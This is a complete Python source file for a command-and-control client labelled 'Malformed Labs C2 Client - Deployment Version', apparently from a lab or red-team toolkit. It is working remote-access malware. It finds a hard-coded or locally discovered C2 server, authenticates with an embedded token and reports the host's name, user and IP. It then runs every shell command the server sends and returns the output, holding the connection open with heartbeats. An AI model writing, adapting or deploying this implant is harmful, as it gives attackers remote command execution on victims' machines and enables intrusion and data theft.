#!/usr/bin/env python3
"""
Malformed Labs C2 Client - Deployment Version
Streamlined Command and Control Client optimized for target deployment
Features: Fast auto-discovery, timeout handling, minimal dependencies
"""

import socket
import json
import time
import threading
import subprocess
import platform
import os
import sys
from datetime import datetime
import logging

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

class FastNetworkManager:
    """Lightweight network discovery with fast timeouts"""
    
    def __init__(self):
        self.system = platform.system().lower()
        self.primary_ip = self._get_primary_ip()
        
    def _get_primary_ip(self):
        """Get primary IP quickly"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(2)  # Fast timeout
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"
    
    def test_connection_fast(self, host, port, timeout=3):
        """Fast connection test with short timeout"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            result = sock.connect_ex((host, port))
            sock.close()
            return result == 0
        except:
            return False
    
    def discover_c2_fast(self, port=8888):
        """Fast C2 server discovery with common addresses"""
        candidates = []
        
        # Add primary IP variations
        if self.primary_ip and self.primary_ip != "127.0.0.1":
            candidates.append(self.primary_ip)
            
            # Add gateway (.1 variant)
            ip_parts = self.primary_ip.split('.')
            if len(ip_parts) == 4:
                gateway = f"{ip_parts[0]}.{ip_parts[1]}.{ip_parts[2]}.1"
                candidates.append(gateway)
        
        # Add common Docker addresses
        candidates.extend([
            "192.168.210.13",  # Container IP
            "localhost",
            "127.0.0.1"
        ])
        
        # Test each candidate quickly
        reachable = []
        for host in candidates:
            if self.test_connection_fast(host, port, timeout=2):
                reachable.append(host)
                logger.info(f"[FOUND] Reachable C2 server: {host}:{port}")
        
        return reachable

class SimpleConfig:
    """Simple configuration handler"""
    
    def __init__(self):
        self.config = {
            'server': {'host': '192.168.210.120', 'port': 8888},
            'client': {'auth_token': 'malformed_labs_c2_2025'}
        }
        self._load_config()
    
    def _load_config(self):
        """Load config if exists"""
        try:
            if os.path.exists('c2_config.json'):
                with open('c2_config.json', 'r') as f:
                    loaded = json.load(f)
                    self.config.update(loaded)
        except:
            pass  # Use defaults
    
    def get_server(self):
        """Get server info"""
        return self.config['server']['host'], self.config['server']['port']
    
    def get_auth_token(self):
        """Get auth token"""
        return self.config['client']['auth_token']

class StreamlinedC2Client:
    """Streamlined C2 client optimized for deployment"""
    
    def __init__(self, server_host=None, server_port=None):
        self.config = SimpleConfig()
        self.network = FastNetworkManager()
        
        # Use provided or config values
        if server_host and server_port:
            self.server_host = server_host
            self.server_port = server_port
        else:
            self.server_host, self.server_port = self.config.get_server()
        
        self.socket = None
        self.running = False
        self.client_id = None
        self.auth_token = self.config.get_auth_token()
        self.client_info = self._get_basic_info()
        
    def _get_basic_info(self):
        """Get essential system info only"""
        try:
            return {
                'hostname': platform.node(),
                'system': platform.system(),
                'user': os.getenv('USER') or os.getenv('USERNAME') or 'Unknown',
                'ip': self.network.primary_ip,
                'python': platform.python_version()
            }
        except:
            return {'hostname': 'unknown', 'system': 'unknown'}
    
    def connect(self, timeout=5):
        """Connect to C2 server with timeout and keep-alive"""
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            
            # Enable socket keep-alive at OS level
            self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            
            # Platform-specific keep-alive settings
            if hasattr(socket, 'TCP_KEEPIDLE'):
                self.socket.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPIDLE, 60)
            if hasattr(socket, 'TCP_KEEPINTVL'):
                self.socket.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPINTVL, 10)
            if hasattr(socket, 'TCP_KEEPCNT'):
                self.socket.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPCNT, 6)
            
            self.socket.settimeout(timeout)
            
            logger.info(f"Connecting to {self.server_host}:{self.server_port}")
            self.socket.connect((self.server_host, self.server_port))
            
            # Wait for server handshake first
            handshake = self._receive_data()
            if not handshake or handshake.get('type') != 'handshake':
                logger.error("Invalid handshake from server")
                return False
            
            logger.info(f"Received handshake: {handshake.get('message', 'Unknown')}")
            
            # Now send authentication
            auth_data = {
                'type': 'auth',
                'token': self.auth_token,
                'info': self.client_info  # Server expects 'info', not 'client_info'
            }
            
            self._send_data(auth_data)
            
            # Wait for auth response
            response = self._receive_data()
            if response and response.get('type') == 'auth_success':
                self.client_id = response.get('client_id')
                logger.info(f"Authentication successful. Client ID: {self.client_id}")
                logger.info("Connection established with keep-alive enabled")
                return True
            else:
                logger.error(f"Authentication failed: {response}")
                return False
                
        except socket.timeout:
            logger.error("Connection timeout")
            return False
        except Exception as e:
            logger.error(f"Connection error: {e}")
            return False
    
    def auto_connect(self):
        """Auto-discover and connect"""
        logger.info("Starting auto-discovery...")
        
        # First try configured server
        if self.connect(timeout=3):
            return True
        
        # Try discovery
        reachable_servers = self.network.discover_c2_fast(self.server_port)
        
        for server in reachable_servers:
            if server != self.server_host:  # Don't retry the same one
                logger.info(f"Trying discovered server: {server}")
                self.server_host = server
                if self.connect(timeout=3):
                    return True
        
        logger.error("No reachable C2 servers found")
        return False
    
    def _send_data(self, data):
        """Send JSON data"""
        try:
            json_data = json.dumps(data)
            message = json_data.encode('utf-8')
            length = len(message)
            
            self.socket.sendall(length.to_bytes(4, byteorder='big'))
            self.socket.sendall(message)
        except Exception as e:
            logger.error(f"Send error: {e}")
            raise
    
    def _receive_data(self):
        """Receive JSON data"""
        try:
            # Get length
            length_data = b''
            while len(length_data) < 4:
                chunk = self.socket.recv(4 - len(length_data))
                if not chunk:
                    return None
                length_data += chunk
            
            length = int.from_bytes(length_data, byteorder='big')
            
            # Get message
            message = b''
            while len(message) < length:
                chunk = self.socket.recv(min(length - len(message), 4096))
                if not chunk:
                    return None
                message += chunk
            
            return json.loads(message.decode('utf-8'))
        except Exception as e:
            logger.error(f"Receive error: {e}")
            return None
    
    def _execute_command(self, command):
        """Execute system command with timeout"""
        try:
            logger.info(f"Executing: {command[:50]}{'...' if len(command) > 50 else ''}")
            
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=20  # Shorter timeout
            )
            
            return {
                'stdout': result.stdout,
                'stderr': result.stderr,
                'returncode': result.returncode,
                'command': command
            }
        except subprocess.TimeoutExpired:
            return {
                'stdout': '',
                'stderr': 'Command timeout (20s)',
                'returncode': -1,
                'command': command
            }
        except Exception as e:
            return {
                'stdout': '',
                'stderr': str(e),
                'returncode': -1,
                'command': command
            }
    
    def _handle_commands(self):
        """Handle server commands - simplified for persistent server"""
        while self.running:
            try:
                # No timeout - server maintains connection
                self.socket.settimeout(None)
                
                data = self._receive_data()
                if not data:
                    if not self.running:
                        break
                    # Server might be idle, just continue
                    time.sleep(1)
                    continue
                
                cmd_type = data.get('type')
                logger.debug(f"Received: {cmd_type}")
                
                if cmd_type == 'command':
                    command = data.get('command', '')
                    cmd_id = data.get('command_id', 'unknown')
                    
                    result = self._execute_command(command)
                    
                    response = {
                        'type': 'command_result',
                        'command_id': cmd_id,
                        'client_id': self.client_id,
                        'result': result,
                        'timestamp': datetime.now().isoformat()
                    }
                    
                    self._send_data(response)
                    
                elif cmd_type == 'ping':
                    pong = {
                        'type': 'pong',
                        'client_id': self.client_id,
                        'timestamp': datetime.now().isoformat()
                    }
                    self._send_data(pong)
                    
                elif cmd_type == 'heartbeat_ack':
                    logger.debug("Heartbeat acknowledged by server")
                    
                elif cmd_type == 'disconnect':
                    logger.info("Server requested disconnect")
                    break
                    
            except (ConnectionResetError, ConnectionAbortedError, BrokenPipeError):
                logger.error("Connection lost - server may have shut down")
                break
            except Exception as e:
                logger.error(f"Command handler error: {e}")
                # For other errors, just continue - server maintains connection
                time.sleep(1)
                continue
    
    def _close_socket(self):
        """Close socket safely"""
        if self.socket:
            try:
                self.socket.close()
            except:
                pass
            self.socket = None
    
    def _reconnect(self):
        """Attempt to reconnect to server"""
        logger.info("Attempting to reconnect...")
        return self.connect(timeout=10)
    
    def _heartbeat(self):
        """Send periodic heartbeat to server"""
        while self.running:
            try:
                heartbeat = {
                    'type': 'heartbeat',
                    'client_id': self.client_id,
                    'timestamp': datetime.now().isoformat(),
                    'status': 'alive'
                }
                self._send_data(heartbeat)
                logger.debug(f"Heartbeat sent at {datetime.now().strftime('%H:%M:%S')}")
                time.sleep(30)  # Normal 30 second interval - server maintains connection
            except Exception as e:
                logger.error(f"Heartbeat error: {e}")
                # If heartbeat fails, connection is likely lost
                break
    
    def run(self):
        """Main run loop - simplified for persistent server"""
        # Initial connection
        if not self.auto_connect():
            logger.error("Initial connection failed")
            return False
        
        self.running = True
        logger.info("Connected to persistent C2 server")
        
        # Start threads
        cmd_thread = threading.Thread(target=self._handle_commands, daemon=True)
        heartbeat_thread = threading.Thread(target=self._heartbeat, daemon=True)
        
        cmd_thread.start()
        heartbeat_thread.start()
        
        logger.info("Client running - server maintains persistent connection")
        
        # Simple keep-alive - server handles persistence
        try:
            while self.running and cmd_thread.is_alive():
                time.sleep(5)
                
        except KeyboardInterrupt:
            logger.info("Keyboard interrupt - shutting down")
            self.stop()
        
        logger.info("Client finished")
        return True
    
    def stop(self):
        """Stop client"""
        self.running = False
        if self.socket:
            try:
                disconnect = {
                    'type': 'disconnect',
                    'client_id': self.client_id,
                    'timestamp': datetime.now().isoformat()
                }
                self._send_data(disconnect)
            except:
                pass
            self.socket.close()
        logger.info("Client stopped")

def main():
    """Main function"""
    print("=== Malformed Labs C2 Client - Deployment Version ===")
    
    # Handle command line args
    if len(sys.argv) >= 3:
        host = sys.argv[1]
        port = int(sys.argv[2])
        print(f"Direct mode: {host}:{port}")
        client = StreamlinedC2Client(host, port)
    elif len(sys.argv) == 2 and sys.argv[1] in ['--discover', '-d']:
        print("Discovery mode:")
        nm = FastNetworkManager()
        servers = nm.discover_c2_fast(8888)
        if servers:
            print(f"Found {len(servers)} reachable servers:")
            for server in servers:
                print(f"  - {server}:8888")
        else:
            print("No reachable servers found")
        return
    else:
        print("Auto-discovery mode")
        client = StreamlinedC2Client()
    
    print("Press Ctrl+C to stop\n")
    
    try:
        success = client.run()
        if not success:
            print("[ERROR] Failed to connect to C2 server")
            sys.exit(1)
    except KeyboardInterrupt:
        print("\nShutting down...")
        client.stop()
    except Exception as e:
        print(f"[ERROR] Unexpected error: {e}")
        sys.exit(1)
    
    print("Client shutdown complete.")

if __name__ == "__main__":
    main()